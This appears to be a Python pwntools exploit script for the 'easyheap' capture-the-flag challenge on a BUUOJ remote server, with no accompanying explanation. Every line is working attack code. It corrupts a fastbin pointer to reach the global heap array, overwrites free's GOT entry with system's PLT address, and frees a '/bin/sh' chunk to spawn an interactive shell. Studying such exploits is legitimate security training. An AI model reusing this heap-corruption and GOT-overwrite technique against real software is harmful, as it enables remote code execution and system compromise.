# coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
elf = ELF ("./easyheap")
# sh = process("./easyheap")
sh = remote("node3.buuoj.cn",26887)
def cmd(choice):
    sh.sendlineafter("Your choice :",str(choice))

def create(size,content):
    cmd(1)
    sh.recvuntil("Size of Heap")
    sh.send(str(size))
    sh.recvuntil("Content of heap:",timeout = 2)
    sh.send(str(content))

def edit(index,size,content):
    cmd(2)
    sh.sendlineafter("Index :",str(index))
    sh.sendafter("Size of Heap : ",str(size))
    sh.sendafter("Content of heap : ",str(content))

def delete(index):
    cmd(3)
    sh.sendafter("Index :",str(index))

free_got = elf.got['free']
system_plt = elf.plt['system']
heaparray = 0x6020C0
create(0x68,"aaaa")
create(0x68,"bbbb")
create(0x68,"cccc")
delete(2)
payload_1 = '/bin/sh\x00' + 'a' * 0x60 + p64(0x71) + p64(heaparray-0x13)
edit(1,len(payload_1),payload_1)
create(0x68,"cccc")
create(0x68,"dddd")
payload_3 = '\x00' * 3 +  'a' * 0x20 + p64(free_got)
edit(3,len(payload_3),payload_3)
payload_0 = p64(system_plt)
edit(0,len(payload_0),payload_0)
delete(1)
sh.interactive()